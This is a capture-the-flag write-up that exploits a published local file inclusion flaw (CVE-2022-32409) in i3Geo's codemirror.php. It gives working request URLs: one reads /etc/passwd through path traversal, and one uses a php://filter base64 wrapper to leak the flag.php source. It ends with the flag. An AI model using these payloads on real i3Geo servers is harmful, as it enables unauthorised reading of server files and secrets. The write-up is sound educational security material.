# Writeup

- Navigating to http://exploracao.hkn will redirect to http://exploracao.hkn/i3geo/init/index.php?home=, the main i3Geo view
- Here we have a menu with a number of interfaces etc. to choose from - the most interesting for us being "Flag" with a psyduck map
- Clicking this takes us to http://exploracao.hkn/i3geo/flag.php, but we just get "Flag is only visible to admin user"
- Since we have to do with specific real software, we search online for vulnerabilities, and find a few CVEs for both XSS and one for LFI
- The LFI CVE ([CVE-2022-32409](https://nvd.nist.gov/vuln/detail/CVE-2022-32409)) seems most useful since we have a known local file we want to read. This is a LFI in the `codemirror.php` file under `/exemplos`
- The description links to a PoC: https://github.com/wagnerdracha/ProofOfConcept/blob/main/i3geo/i3geo_proof_of_concept.txt
- This has PoCs for both the LFI and XSS vulns (discovered by same person). LFI PoC:
  - http://.../i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd
- We try just the straight forward version of this on the challenge and get an immediate hit:
  - http://exploracao.hkn/i3geo/exemplos/codemirror.php?pagina=/etc/passwd
- So we have LFI - we try including the flag:
  - http://exploracao.hkn/i3geo/exemplos/codemirror.php?pagina=../flag.php
- But again, we only see the admin message since the flag file is a PHP file and is interpreted when included
- This is where some knowledge of PHP filters come in. We can use `php://filter/convert.base64-encode/resource=<file>` to base64 encode `<file>` *before* including it (other conversion filters likely work as well). We use this on the flag:
  - http://exploracao.hkn/i3geo/exemplos/codemirror.php?pagina=php://filter/convert.base64-encode/resource=../flag.php
- From this we get a long base64 string, which we can decode and now see the original PHP source, including this:

```php
<?php
    if ($_SESSION["username"] === "administrador") {
        echo "<h2>DDC{1nclu54o_d3_4rqu1v0_l0c4l}</h2>";
    } else {
        echo "<h2>Flag is only visible to admin user</h2>";
    }
?>
```

## Flag

`DDC{1nclu54o_d3_4rqu1v0_l0c4l}`
